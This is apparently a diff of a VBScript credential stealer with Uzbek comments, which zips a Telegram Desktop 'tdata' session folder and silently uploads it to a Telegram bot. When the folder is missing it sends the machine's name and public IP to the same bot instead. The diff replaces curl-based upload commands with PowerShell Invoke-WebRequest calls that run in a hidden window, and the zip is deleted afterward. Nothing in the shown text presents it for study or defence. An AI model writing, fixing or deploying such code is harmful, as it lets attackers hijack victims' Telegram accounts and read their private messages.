@@ -1,4 +1,3 @@
-' Bu VBS hech qanday PowerShell ishlatmaydi! Faqat CMD dan foydalanadi.
 Set WshShell = CreateObject("WScript.Shell")
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
@@ -24,19 +23,19 @@ If FSO.FolderExists(TDataPath) Then
     objZip.CopyHere objFolder.Items, 16
     On Error GoTo 0
 
-    ' ZIP siqilishi uchun vaqt beramiz
+    ' ZIP siqilishi uchun vaqt
     WScript.Sleep 3000
 
-    ' Telegramga fayl yuborish uchun CMD ni ishlatamiz (PowerShell emas!)
-    WshShell.Run "cmd /c curl -s -X POST https://api.telegram.org/bot" & BOT_TOKEN & "/sendDocument -F chat_id=" & CHAT_ID & " -F document=@" & ZipPath & " -F caption='✅ tdata yigildi! PC: " & PCName & "'", 0, True
+    ' ✅ Telegramga fayl yuborish (BU YERGA TUZATILGAN KOD QO'YILDI)
+    WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendDocument' -Method Post -ContentType 'multipart/form-data' -Form @{chat_id='" & CHAT_ID & "'; document=@'" & ZipPath & "' ; caption='✅ tdata yigildi! PC: " & PCName & "'}""", 0, True
 
     FSO.DeleteFile(ZipPath)
 Else
-    ' tdata topilmasa
     Set http = CreateObject("MSXML2.ServerXMLHTTP")
     http.open "GET", "https://api.ipify.org", False
     http.send
     ip = http.responseText
 
-    WshShell.Run "cmd /c curl -s -X POST https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage -d chat_id=" & CHAT_ID & " -d text='⚠️ tdata topilmadi! PC: " & PCName & ", IP: " & ip & "'", 0, True
+    ' Agar tdata topilmasa
+    WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -ContentType 'application/json' -Body '{\""chat_id\"":" & CHAT_ID & ", \""text\"": \""⚠️ tdata topilmadi! PC: " & PCName & ", IP: " & ip & "\""}'""", 0, True
 End If
